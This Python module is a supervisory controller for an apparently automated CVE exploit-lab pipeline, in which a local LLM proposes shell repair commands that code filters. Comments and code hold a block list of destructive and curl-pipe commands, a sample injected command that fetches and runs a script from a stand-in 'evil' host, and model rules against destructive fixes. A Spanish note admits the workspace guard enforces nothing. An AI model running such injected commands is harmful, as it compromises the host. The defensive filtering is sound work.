"""
Autonomous Agent Controller — the external supervisor that wraps the CVE exploit pipeline.

Architecture:
  Controller (this file) — state machine, limits, checkpoints, decision logic
  Qwen 7B via Ollama      — diagnoses errors and proposes repairs (proposals only)
  cve_agent.py            — the tool runner (executes what the controller allows)
  error_analyzer.py       — classifies and fingerprints errors
  repair_memory.py        — persistent history of what has and hasn't worked
  workspace_guard.py      — tracks file mutations and enforces scope

The controller NEVER lets the LLM decide:
  - Whether a repair succeeded (that is verified by deterministic code)
  - Whether to continue or abort (that is decided by policy + limits)

NOTA (2026-11-24): la linea de arriba decia tambien "What files to modify outside of the
workspace (blocked by workspace_guard)" -- no es cierto hoy. workspace_guard.WorkspaceGuard
es puramente detectar-y-reportar (snapshot() + diff(); diff() nunca lanza ni bloquea nada, solo
devuelve una lista de violaciones para que alguien las imprima) y, ademas, el unico sitio donde
se usa (cve_agent.py ~linea 16213) solo llama a snapshot() -- nunca a diff() ni a
report_violations(), asi que hoy no reporta nada tampoco, esta inerte. No hay ningun mecanismo
real en el repo que impida a execute_repair() tocar un fichero fuera de `cwd`. Si haceis falta
esa garantia de verdad, haria falta llamar a guard.diff() despues de cada repair y abortar/avisar
en las violaciones -- lo dejo anotado en COORDINATION.md en vez de intentarlo yo mismo a ciegas
en un fichero de 16k lineas que esta activo ahora mismo.

Final status values (only these):
  COMPLETED_AND_VALIDATED
  COMPLETED_WITH_LIMITATIONS
  FAILED_RECOVERABLE
  BLOCKED
  UNVERIFIED
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import time
import traceback
import urllib.request
from dataclasses import dataclass, field
from enum import Enum
from typing import Callable, List, Optional, Tuple

from .error_analyzer import (
    ErrorCategory, ErrorRecord, analyze_error, render_error_summary,
)
from .repair_memory import RepairMemory

# ── Policy constants ──────────────────────────────────────────────────────────

_MAX_TOTAL_ITERATIONS  = int(os.environ.get("BINORACLE_MAX_ITERS",   "10"))
_MAX_ATTEMPTS_PER_ERR  = int(os.environ.get("BINORACLE_MAX_ATTEMPTS", "3"))
_MAX_STRATEGY_SWITCHES = int(os.environ.get("BINORACLE_MAX_STRAT",    "4"))
_PHASE_TIMEOUT_S       = int(os.environ.get("BINORACLE_PHASE_TIMEOUT","300"))
_NO_PROGRESS_LIMIT     = 3
_OLLAMA_URL            = os.environ.get("BINORACLE_BASE_URL", "http://localhost:11434")
_OLLAMA_MODEL          = os.environ.get("BINORACLE_MODEL", "qwen2.5-coder:7b")
_REPAIR_TIMEOUT_S      = 60   # max seconds for a single repair command


# ── Status ────────────────────────────────────────────────────────────────────

class FinalStatus(str, Enum):
    COMPLETED_AND_VALIDATED    = "COMPLETED_AND_VALIDATED"
    COMPLETED_WITH_LIMITATIONS = "COMPLETED_WITH_LIMITATIONS"
    FAILED_RECOVERABLE         = "FAILED_RECOVERABLE"
    BLOCKED                    = "BLOCKED"
    UNVERIFIED                 = "UNVERIFIED"


# ── Progress scoring ──────────────────────────────────────────────────────────

@dataclass
class IterationResult:
    iteration:     int
    phase:         str
    success:       bool
    error:         Optional[ErrorRecord] = None
    output:        str = ""
    files_changed: List[str] = field(default_factory=list)
    new_errors:    int = 0
    resolved:      bool = False
    score:         float = 0.0

    def has_progress(self) -> bool:
        return self.score > 0.0 or self.resolved or self.success


def _score_iteration(prev: Optional[IterationResult], curr: IterationResult) -> float:
    score = 0.0
    if curr.success:
        score += 0.6
    if curr.resolved:
        score += 0.3
    if curr.files_changed:
        score += 0.1
    if prev and curr.new_errors < prev.new_errors:
        score += 0.2
    if prev and curr.output and curr.output == prev.output:
        score -= 0.3
    return max(0.0, min(1.0, score))


# ── Checkpoint ────────────────────────────────────────────────────────────────

@dataclass
class Checkpoint:
    name:       str
    phase:      str
    created_at: float
    state:      dict = field(default_factory=dict)
    git_sha:    str = ""

    def to_dict(self) -> dict:
        return {"name": self.name, "phase": self.phase,
                "created_at": self.created_at, "state": self.state,
                "git_sha": self.git_sha}

    @staticmethod
    def from_dict(d: dict) -> "Checkpoint":
        return Checkpoint(name=d["name"], phase=d["phase"],
                          created_at=d["created_at"], state=d.get("state", {}),
                          git_sha=d.get("git_sha", ""))


def _git_sha(cwd: str = ".") -> str:
    try:
        r = subprocess.run(["git", "rev-parse", "HEAD"],
                           capture_output=True, text=True, timeout=5, cwd=cwd)
        return r.stdout.strip()[:12] if r.returncode == 0 else ""
    except Exception:
        return ""


# ── Deterministic repair table ────────────────────────────────────────────────
# Maps ErrorCategory → list of concrete commands to try (in order).
# Variables: {pkg} = extracted package name, {file} = file from error,
#            {container} = docker container name from context.

_REPAIR_STEPS: dict = {
    ErrorCategory.MISSING_DEP: [
        "pip install {pkg} --quiet",
        "pip install --upgrade {pkg} --quiet",
    ],
    ErrorCategory.NPM_INSTALL: [
        "docker exec {container} npm install --prefer-offline",
    ],
    ErrorCategory.CONTAINER: [
        "docker start {container}",
        "docker restart {container}",
    ],
    ErrorCategory.TIMEOUT: [
        "docker restart {container}",
    ],
    ErrorCategory.NETWORK: [],                 # sleep + retry handled inline
    ErrorCategory.DISK_FULL: [
        "docker system prune -f --volumes",
    ],
    ErrorCategory.PERMISSION: [
        "chmod +x {file}",
    ],
    ErrorCategory.PORT_CONFLICT: [
        "docker stop {container}",
        "docker rm -f {container}",
    ],
}

# Commands the repair executor is NEVER allowed to run (defense-in-depth)
# NOTA (fix 2026-11-24): el patron rm -rf original era "rm\s+-rf\s+[^/tmp]" -- [^/tmp] es
# una CLASE de caracteres (cualquier caracter que no sea '/','t','m','p'), no "una ruta que no
# empiece por /tmp" como pretendia. Como toda ruta absoluta empieza por '/' (que SI esta en esa
# clase excluida), el patron jamas hacia match en "rm -rf /", "rm -rf /etc", "rm -rf /home/..."
# -- exactamente los casos destructivos que debia bloquear. Verificado con pruebas. Arreglado
# con un lookahead negativo real sobre "/tmp/".
_FORBIDDEN_RE = re.compile(
    r"rm\s+-[a-z]*r[a-z]*f[a-z]*\s+(?!/tmp/)\S|"   # rm -rf <algo> que no sea bajo /tmp/
    r"rm\s+-[a-z]*f[a-z]*r[a-z]*\s+(?!/tmp/)\S|"   # variante -fr
    r"git\s+reset\s+--hard|"
    r"git\s+push\s+--force|"
    r"DROP\s+(TABLE|DATABASE)|"
    r"sudo\s+(passwd|usermod|groupmod)|"
    r"curl\s+https?://\S+\s*\|",
    re.I
)

# NOTA (fix 2026-11-24): el allowlist de _ask_qwen_for_fix solo comprobaba que el comando
# EMPEZARA por un prefijo permitido (re.match sin ancla de fin), así que un LLM (o un error
# con contenido no confiable -- root_cause/stderr vienen de salida real de Docker/objetivos
# CVE, potencialmente hostiles) podia colar "pip install x && curl evil/x.sh -o /tmp/x.sh &&
# bash /tmp/x.sh" y pasaba el allowlist igualmente, ejecutandose despues via shell=True. Este
# patron bloquea cualquier metacaracter de shell que permita encadenar o inyectar comandos
# adicionales tras el prefijo permitido.
_SHELL_METACHAR_RE = re.compile(r"[;&|`$\n<>]")

# Packages that may never be pip-installed by autonomous repair
_FORBIDDEN_PKGS = {"pwntools", "exploit", "shellcode", "rootkit"}


# ── Qwen repair oracle ────────────────────────────────────────────────────────

def _ask_qwen_for_fix(error: ErrorRecord, context_hint: str = "") -> Optional[str]:
    """
    Call Qwen 2.5-Coder:7b via Ollama to get a repair suggestion for `error`.
    Returns a one-line shell command string, or None if unavailable / refused.
    Only shell commands from the allowlist are accepted.
    """
    prompt = (
        "You are an autonomous repair agent for a local security research tool (binoracle). "
        "An error occurred during a Docker-based CVE lab. Suggest ONE shell command to fix it.\n\n"
        "RULES:\n"
        "- Reply with ONLY the shell command, nothing else — no explanation, no markdown\n"
        "- Only safe, reversible commands: pip install, docker restart <name>, chmod, git stash\n"
        "- NEVER suggest: rm -rf, git reset --hard, destructive operations\n"
        "- Include the actual container name in docker commands when you know it\n"
        "- For MISSING_DEP errors: use 'pip3 install <package>'\n"
        "- For DOCKER_RUNTIME errors: use 'docker restart <container>'\n"
        "- For PERMISSION errors: use 'chmod 755 <file>' or 'chmod +x <file>'\n\n"
        f"Error category: {error.category.value}\n"
        f"Error root cause: {(error.root_cause or '')[:300].replace(chr(10), ' ')}\n"
        f"Stderr: {(error.stderr or '')[:200].replace(chr(10), ' ')}\n"
        f"Context: {(context_hint or '')[:200].replace(chr(10), ' ')}\n\n"
        "Command to fix (one line only):"
    )
    try:
        payload = json.dumps({
            "model":  _OLLAMA_MODEL,
            "prompt": prompt,
            "stream": False,
            "options": {"temperature": 0.0, "num_predict": 150},
        }).encode()
        req = urllib.request.Request(
            f"{_OLLAMA_URL.rstrip('/')}/api/generate",
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read())
        cmd = data.get("response", "").strip().splitlines()[0].strip()
        # Safety: reject if forbidden
        if _FORBIDDEN_RE.search(cmd):
            return None
        # Only accept pip, docker, chmod, git-safe commands -- prefix match alone is not
        # enough (see _SHELL_METACHAR_RE note above): also reject any shell metacharacter that
        # would let the LLM smuggle extra commands after an allowed prefix.
        if not re.match(r"^(pip[23]? install|docker (restart|start|stop|logs|ps)|chmod|git (stash|status|diff))", cmd, re.I):
            return None
        if _SHELL_METACHAR_RE.search(cmd):
            return None
        return cmd
    except Exception:
        return None


# ── Repair executor (the missing piece) ──────────────────────────────────────

def _run_cmd(cmd: str, cwd: str, timeout: int = _REPAIR_TIMEOUT_S) -> Tuple[bool, str]:
    """Execute a shell command safely. Returns (success, output)."""
    if _FORBIDDEN_RE.search(cmd):
        return False, f"[repair] blocked by policy: {cmd}"
    # Defense-in-depth: block shell metacharacters here too, at the actual execution
    # chokepoint for both the deterministic table AND the Qwen-proposed path, in case a
    # future template ever interpolates an unfiltered value (e.g. error.file_path is not
    # regex-filtered like pkg/container are).
    if _SHELL_METACHAR_RE.search(cmd):
        return False, f"[repair] blocked (shell metacharacter): {cmd}"
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, cwd=cwd,
        )
        output = (r.stdout + r.stderr)[-1000:]
        return r.returncode == 0, output
    except subprocess.TimeoutExpired:
        return False, f"[repair] timeout after {timeout}s: {cmd}"
    except Exception as e:
        return False, f"[repair] exception: {e}"


def _extract_pkg(error: ErrorRecord) -> str:
    """Extract the package name from a MISSING_DEP error."""
    # Try from root_cause: "No module named 'foo'" or "Cannot find module 'foo'"
    for pat in [r"No module named ['\"]?([\w\-\.]+)", r"Cannot find module ['\"]?([\w\-\./]+)",
                r"ModuleNotFoundError.*['\"]?([\w\-\.]+)['\"]", r"ImportError.*['\"]?([\w\-\.]+)"]:
        m = re.search(pat, error.root_cause or error.stderr or "")
        if m:
            pkg = m.group(1).replace(".", "-")  # e.g. "pkg_resources" → "pkg-resources"
            if pkg not in _FORBIDDEN_PKGS:
                return pkg
    return ""


def _extract_container(error: ErrorRecord, context: dict) -> str:
    """Extract container name from error or context dict."""
    if context.get("container"):
        return context["container"]
    for text in [error.root_cause or "", error.stderr or ""]:
        m = re.search(r"container[=:\s]+([a-z0-9_\-]+)", text, re.I)
        if m:
            return m.group(1)
    return ""


def execute_repair(
    error: ErrorRecord,
    cwd:   str = ".",
    log:   Callable[[str], None] = lambda m: None,
    context: Optional[dict] = None,
) -> Tuple[bool, str]:
    """
    Autonomously execute a repair for `error`.

    Strategy (in priority order):
    1. Deterministic fix from _REPAIR_STEPS table (no LLM needed)
    2. Backoff sleep for transient/network errors
    3. Qwen-generated fix command (if Ollama available)
    4. Return False if nothing worked

    Returns (repaired_ok, description).
    """
    context = context or {}
    cat = error.category

    # 1. Backoff for transient / network errors
    if cat in (ErrorCategory.NETWORK, ErrorCategory.TRANSIENT) or error.is_transient:
        wait = min(5 * (1 + error.attempts), 30)
        log(f"[repair] transient error — sleeping {wait}s before retry")
        time.sleep(wait)
        return True, f"waited {wait}s (transient)"

    # 2. Deterministic repair table
    steps = _REPAIR_STEPS.get(cat, [])
    for cmd_tpl in steps:
        # Fill template variables
        pkg       = _extract_pkg(error)
        container = _extract_container(error, context)
        file_hint = error.file_path or ""
        cmd = (cmd_tpl
               .replace("{pkg}", pkg or "unknown-pkg")
               .replace("{container}", container or "binoracle-lab")
               .replace("{file}", file_hint or "."))
        # Skip if placeholder couldn't be filled meaningfully
        if "unknown-pkg" in cmd and cat == ErrorCategory.MISSING_DEP:
            continue
        log(f"[repair] running: {cmd}")
        ok, out = _run_cmd(cmd, cwd)
        log(f"[repair] {'OK' if ok else 'FAIL'}: {out[:200]}")
        if ok:
            return True, cmd

    # 3. Qwen fallback (only for non-fatal, non-permission errors)
    if cat not in (ErrorCategory.DISK_FULL, ErrorCategory.PERMISSION, ErrorCategory.PORT_CONFLICT):
        ctx_hint = f"container={context.get('container','?')} cwd={cwd} phase={error.stage}"
        llm_cmd = _ask_qwen_for_fix(error, ctx_hint)
        if llm_cmd:
            # Reject commands that need a container/file arg but have none
            _needs_arg = re.match(r"docker\s+(restart|start|stop|rm)\s*$", llm_cmd.strip())
            if _needs_arg:
                log(f"[repair:qwen] skipped (no container arg): {llm_cmd}")
                llm_cmd = None
        if llm_cmd:
            log(f"[repair:qwen] proposed: {llm_cmd}")
            ok, out = _run_cmd(llm_cmd, cwd)
            log(f"[repair:qwen] {'OK' if ok else 'FAIL'}: {out[:200]}")
            if ok:
                return True, llm_cmd

    return False, f"no repair found for category={cat.value}"


# ── Controller ────────────────────────────────────────────────────────────────

@dataclass
class ControllerState:
    cve_id:            str
    phase:             str = "init"
    iteration:         int = 0
    strategy_switches: int = 0
    no_progress_count: int = 0
    errors:            List[ErrorRecord] = field(default_factory=list)
    checkpoints:       List[Checkpoint]  = field(default_factory=list)
    history:           List[IterationResult] = field(default_factory=list)
    final_status:      Optional[FinalStatus] = None
    start_time:        float = field(default_factory=time.time)
    metrics:           dict = field(default_factory=dict)


class AgentController:
    """
    External supervisor for the CVE exploit pipeline.

    Usage:
        controller = AgentController(cve_id="CVE-2024-1234")
        result = controller.run(pipeline_fn)
    """

    def __init__(
        self,
        cve_id:       str,
        workspace:    str = ".",
        log_fn:       Optional[Callable[[str], None]] = None,
        project_type: str = "",
        context:      Optional[dict] = None,
    ):
        self.cve_id       = cve_id
        self.workspace    = workspace
        self.log          = log_fn or (lambda msg: None)
        self.project_type = project_type
        self.context      = context or {}
        self.state        = ControllerState(cve_id=cve_id)
        self.memory       = RepairMemory()
        self._strategy_history: List[str] = []
        self._repair_case_ids:  List[str] = []

    def save_checkpoint(self, name: str, state: dict) -> Checkpoint:
        cp = Checkpoint(name=name, phase=self.state.phase, created_at=time.time(),
                        state=state, git_sha=_git_sha(self.workspace))
        self.state.checkpoints.append(cp)
        self.log(f"[checkpoint] saved: {name} (phase={self.state.phase})")
        return cp

    def last_checkpoint(self) -> Optional[Checkpoint]:
        return self.state.checkpoints[-1] if self.state.checkpoints else None

    def _detect_loop(self) -> bool:
        recent = self.state.history[-_NO_PROGRESS_LIMIT:]
        if len(recent) < _NO_PROGRESS_LIMIT:
            return False
        return not any(it.has_progress() for it in recent)

    def _identical_error_loop(self) -> bool:
        fps = [e.fingerprint for e in self.state.errors[-3:]]
        return len(fps) == 3 and len(set(fps)) == 1

    def _pick_repair_strategy(self, error: ErrorRecord) -> str:
        past_fix = self.memory.best_fix_for(error)
        if past_fix:
            self.log(f"[repair_memory] found past fix: {past_fix[:80]}")
            return past_fix
        return error.proposed_fix

    def _is_fatal(self, error: ErrorRecord) -> bool:
        fatal_cats = {ErrorCategory.DISK_FULL, ErrorCategory.PERMISSION, ErrorCategory.PORT_CONFLICT}
        return error.category in fatal_cats and not error.is_transient

    def _record_iteration(
        self, phase: str, success: bool, error: Optional[ErrorRecord] = None,
        output: str = "", files_changed: Optional[List[str]] = None,
    ) -> IterationResult:
        self.state.iteration += 1
        prev = self.state.history[-1] if self.state.history else None
        it = IterationResult(
            iteration=self.state.iteration, phase=phase, success=success, error=error,
            output=output[:500], files_changed=files_changed or [],
            new_errors=len([e for e in self.state.errors if not e.fix_applied]),
            resolved=error is not None and bool(error.fix_applied),
        )
        it.score = _score_iteration(prev, it)
        self.state.history.append(it)
        if not it.has_progress():
            self.state.no_progress_count += 1
        else:
            self.state.no_progress_count = 0
        return it

    def _step_logger(self, msg: str) -> None:
        self.log(f"  [{self.state.phase}] {msg}")

    # ── Main loop ──────────────────────────────────────────────────────────────

    def run(
        self,
        pipeline_fn: Callable[[ControllerState, Callable], tuple],
    ) -> dict:
        """
        Drive the pipeline through the full controlled lifecycle.

        pipeline_fn(state, step_fn) must return:
            (success: bool, output: str, stderr: Optional[str], phase: Optional[str])
        """
        self.log(f"[controller] starting job for {self.cve_id}")
        self.save_checkpoint("initial", {"phase": "init"})
        try:
            result = self._control_loop(pipeline_fn)
        except Exception as exc:
            tb = traceback.format_exc()
            self.log(f"[controller] unhandled exception: {exc}")
            rec = analyze_error("controller", tb, exit_code=1, command="controller.run")
            self.state.errors.append(rec)
            self.state.final_status = FinalStatus.FAILED_RECOVERABLE
            result = {"output": "", "success": False}
        return self._build_report(result)

    def _control_loop(self, pipeline_fn: Callable) -> dict:
        attempt     = 0
        last_output = ""

        while attempt < _MAX_TOTAL_ITERATIONS:
            attempt += 1
            self.log(f"[controller] iteration {attempt}/{_MAX_TOTAL_ITERATIONS} phase={self.state.phase}")

            # ── Safety checks ────────────────────────────────────────────────
            if self._identical_error_loop():
                self.log("[controller] identical error cycle detected — BLOCKED")
                self.state.final_status = FinalStatus.FAILED_RECOVERABLE
                break

            if self._detect_loop():
                self.log(f"[controller] no progress for {_NO_PROGRESS_LIMIT} iters — switching strategy")
                self.state.strategy_switches += 1
                if self.state.strategy_switches > _MAX_STRATEGY_SWITCHES:
                    self.log("[controller] strategy switch limit reached — BLOCKED")
                    self.state.final_status = FinalStatus.BLOCKED
                    break

            # ── Run one pipeline iteration ───────────────────────────────────
            t0 = time.time()
            try:
                success, output, stderr, phase = pipeline_fn(self.state, self._step_logger)
            except Exception:
                output  = ""
                stderr  = traceback.format_exc()
                success = False
                phase   = self.state.phase
            elapsed = time.time() - t0

            # ── Classify error + EXECUTE REPAIR ─────────────────────────────
            error_rec: Optional[ErrorRecord] = None
            repair_ok = False

            if not success and stderr:
                error_rec = analyze_error(
                    stage=phase or self.state.phase, stderr=stderr, stdout=output,
                    exit_code=1, attempts=attempt,
                )
                self.state.errors.append(error_rec)
                self.log(render_error_summary(error_rec))

                if self._is_fatal(error_rec):
                    self.log(f"[controller] fatal error ({error_rec.category.value}) — stopping")
                    self.state.final_status = FinalStatus.FAILED_RECOVERABLE
                    break

                # ── AUTONOMOUS REPAIR: actually execute the fix ──────────────
                repair_ok, repair_msg = execute_repair(
                    error   = error_rec,
                    cwd     = self.workspace,
                    log     = self.log,
                    context = {**self.context, "phase": phase or self.state.phase},
                )
                self.log(f"[controller] repair {'succeeded' if repair_ok else 'failed'}: {repair_msg}")
                if repair_ok:
                    error_rec.fix_applied = repair_msg

                # Record in memory
                case_id = self.memory.record(
                    error        = error_rec,
                    fix_applied  = repair_msg,
                    outcome      = "success" if repair_ok else "failure",
                    project_type = self.project_type,
                )
                self._repair_case_ids.append(case_id)
                self._strategy_history.append(repair_msg)

            self._record_iteration(
                phase=phase or self.state.phase, success=success,
                error=error_rec, output=output,
            )

            if success:
                self.save_checkpoint(f"after_{phase or 'phase'}_{attempt}", {"success": True})
                # Mark any pending repair cases as validated
                for cid in self._repair_case_ids[-3:]:
                    try:
                        self.memory.mark_validated(cid, "success")
                    except Exception:
                        pass
                last_output = output
                self.log(f"[controller] iteration {attempt} succeeded (elapsed={elapsed:.1f}s)")
                self.state.final_status = FinalStatus.COMPLETED_AND_VALIDATED
                break

            last_output = output

        if self.state.final_status is None:
            if any(it.success for it in self.state.history):
                self.state.final_status = FinalStatus.COMPLETED_WITH_LIMITATIONS
            else:
                self.state.final_status = FinalStatus.FAILED_RECOVERABLE

        return {"output": last_output, "success": self.state.final_status == FinalStatus.COMPLETED_AND_VALIDATED}

    def _build_report(self, pipeline_result: dict) -> dict:
        elapsed = time.time() - self.state.start_time
        errors_summary = [
            {"error_id": e.error_id, "category": e.category.value, "severity": e.severity.value,
             "root_cause": e.root_cause, "fix_applied": e.fix_applied, "stage": e.stage}
            for e in self.state.errors
        ]
        self.state.metrics = {
            "total_iterations":  self.state.iteration,
            "strategy_switches": self.state.strategy_switches,
            "total_errors":      len(self.state.errors),
            "repairs_attempted": len(self._repair_case_ids),
            "repairs_succeeded": sum(1 for e in self.state.errors if e.fix_applied),
            "checkpoints":       len(self.state.checkpoints),
            "elapsed_s":         round(elapsed, 1),
            "no_progress_runs":  self.state.no_progress_count,
        }
        return {
            "cve_id":       self.cve_id,
            "final_status": (self.state.final_status or FinalStatus.UNVERIFIED).value,
            "success":      pipeline_result.get("success", False),
            "output":       pipeline_result.get("output", ""),
            "metrics":      self.state.metrics,
            "errors":       errors_summary,
            "checkpoints":  [cp.to_dict() for cp in self.state.checkpoints],
            "strategy_log": self._strategy_history,
        }


# ── Standalone repair helper (called by web_cve, cli, any top-level catcher) ─

def auto_repair_on_exc(
    exc:         BaseException,
    cve_id:      str = "",
    stage:       str = "investigation",
    cwd:         str = ".",
    log:         Callable[[str], None] = lambda m: None,
    context:     Optional[dict] = None,
    *,
    reraise:     bool = False,
) -> Tuple[bool, str]:
    """
    Call this in any top-level `except` block around investigate_cve.
    It classifies the exception, attempts autonomous repair, and either
    returns (repaired_ok, description) or re-raises if `reraise=True`.

    Usage in web_cve._start_job:
        except Exception as e:
            ok, msg = auto_repair_on_exc(e, cve_id=cve_id, log=on_step, cwd=workspace)
            if not ok:
                raise
    """
    tb = traceback.format_exc()
    err = analyze_error(
        stage=stage, stderr=tb, stdout=str(exc), exit_code=1,
        command=f"investigate_cve({cve_id})", attempts=1,
    )
    log(f"[auto_repair] exception in {stage}: {err.root_cause}")
    ok, msg = execute_repair(err, cwd=cwd, log=log, context=context or {})
    if not ok and reraise:
        raise
    return ok, msg


# ── Convenience wrapper for cve_agent ────────────────────────────────────────

def supervised_investigate(
    cve_id:         str,
    investigate_fn: Callable,
    *args,
    log_fn:       Optional[Callable] = None,
    project_type: str = "",
    context:      Optional[dict] = None,
    **kwargs,
) -> dict:
    """
    Thin wrapper: runs investigate_fn inside the controller, returns controller report.

    investigate_fn(state, step_fn, *args, **kwargs) must return
    (success, output, stderr, phase).
    """
    ctrl = AgentController(cve_id=cve_id, log_fn=log_fn, project_type=project_type,
                           context=context or {})

    def pipeline_fn(state, step_fn):
        return investigate_fn(state, step_fn, *args, **kwargs)

    return ctrl.run(pipeline_fn)
